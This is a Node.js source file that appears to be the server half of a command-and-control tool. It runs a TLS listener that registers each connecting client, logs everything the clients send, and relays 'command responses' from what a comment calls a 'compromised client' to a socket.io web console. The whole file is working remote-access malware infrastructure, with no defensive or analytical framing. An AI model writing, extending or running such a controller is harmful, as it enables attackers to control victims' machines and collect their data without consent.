const tls = require('tls')
const fs = require('fs')
const chalk = require('chalk')

// Blank object to store client socket objects. This variable is pass to "prompt.js
const clients = {}
const ioclients = {}

/**
 * options object stores the private key and public cert to be used by tls socket for traffic encryption.
 * Note: the same key may end up being used for https web portal as well.
 */
 const options = {
    key: fs.readFileSync('server-cert/private-key.pem'),
    cert: fs.readFileSync('server-cert/public-cert.pem')
}

/**
 * Purpose: to initialize clients connecting and assign unique ID to store in "clients" object
 */
 var server = tls.createServer(options, (client) => {
    
    // Assign IPv4-{random number between 1-100000} to each client and store within the socket object
    client.connID = client.remoteAddress.replace(/^.*:/, '') + '-' + Math.floor(Math.random() * 100000)
    console.log(chalk.green(client.connID))

    // Add the client into the "clients" object and use their unique ID as the key to access the client
    clients[client.connID] = client
    client.write('_+4' + client.connID)
    console.log('NEW CONNECTION!')
    

    // Dump data from any client to console along with their ID
    client.on('data', (data) => {
        console.log(`From Client (${client.connID}):\n ${data.toString()}`)

        if (ioclients[client.connID]) {
            ioclients[client.connID].emit('cmdRes', data.toString())
        }
        //Socketio not connected, goes to void
        /**
         * SEND RESPONSE FROM COMPROMISED CLIENT TO SOCKET IO CLIENT (WEB) FROM HERE
         */

    })

    // When client disconnects, remove it from the "clients" object
    client.on('close', () => {
        console.log(chalk.red(`Client has disconnected ${client.connID}`))
        delete clients[client.connID]
    })

    // when client throws error, remove it from the "clients" object
    client.on('error', (error) => {
        console.log(chalk.red(`Error has occured on ${client.connID}\n${error}`))
        delete clients[client.connID]
    })
})

module.exports = {
    server,
    clients,
    ioclients
}